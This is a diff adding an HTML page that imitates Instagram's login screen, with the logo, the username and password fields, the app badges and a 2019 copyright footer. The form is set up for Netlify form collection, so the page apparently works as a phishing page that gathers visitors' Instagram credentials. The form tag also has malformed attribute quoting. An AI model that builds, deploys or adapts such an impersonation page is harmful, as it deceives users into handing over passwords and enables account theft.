@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>instagram</title>
+    <style>
+      #Instagram_logo {
+        margin: auto;
+      }
+      * {
+        background-color: #fafafa;
+      }
+      body {
+        text-align: center;
+        background-color: #fafafa;
+      }
+      input {
+        border-width: thin;
+      }
+      .input {
+        border-style: ridge;
+      }
+
+      #log {
+        border-radius: 6px;
+        background-color: #c4e0fa;
+        color: #ffffff;
+      }
+
+      ul {
+        list-style-type: none;
+        margin: 0;
+        padding: 0;
+      }
+
+      li {
+        display: inline;
+      }
+    </style>
+  </head>
+  <body>
+    <section>
+      <main>
+        <article>
+          <br />
+
+          <div id="Instagram_logo">
+            <img src="Instagram_logo.svg" style="width:157px;height:51px;" />
+          </div>
+          <br />
+          <div>
+            <form method="post action="index.html" data-netlify="true">
+              <input
+                id="input"
+                class="input"
+                type="text"
+                placeholder="Phone number, username, or email"
+                style="width:295px;height:38px;"
+                oninput="color()"
+              />
+              <br /><br />
+              <input
+                class="input"
+                type="password"
+                placeholder="Password"
+                style="width:295px;height:38px;"
+              />
+              <br /><br />
+              <input
+                id="log"
+                type="submit"
+                value="Log In"
+                style="width:295px;height:30px;"
+              />
+            </form>
+          </div>
+          <br /><br />
+          <div>Don't have an account? <a href="index.html">Sign up</a></div>
+          <br />
+          <br />
+          <div>
+            Get the app.
+          </div>
+          <br />
+          <div>
+            <img src="180ae7a0bcf7.png" style="width:136px;height:44px;" />
+            <img src="e9cd846dc748.png" style="width:136px;height:44px;" />
+          </div>
+          <br />
+          <br />
+          <br />
+        </article>
+      </main>
+      <footer>
+        <nav>
+          <ul style="color:#366088;">
+            <li>About us&nbsp</li>
+            <li>Support&nbsp</li>
+            <li>Press&nbsp</li>
+            <li>API&nbsp</li>
+            <li>Jobs&nbsp</li>
+            <li>Privacy&nbsp</li>
+            <li>Terms&nbsp</li>
+            <li>Directory&nbsp</li>
+            <li>Profiles&nbsp</li>
+            <li>Hashtags&nbsp</li>
+          </ul>
+        </nav>
+        <br />
+        <div style="color:#ABABAB;">© 2019 Instagram from Facebook</div>
+      </footer>
+    </section>
+    <Script>
+      function color(){document.getElementById('log').style.background="#3897F0"
+      }
+    </Script>
+  </body>
+</html>
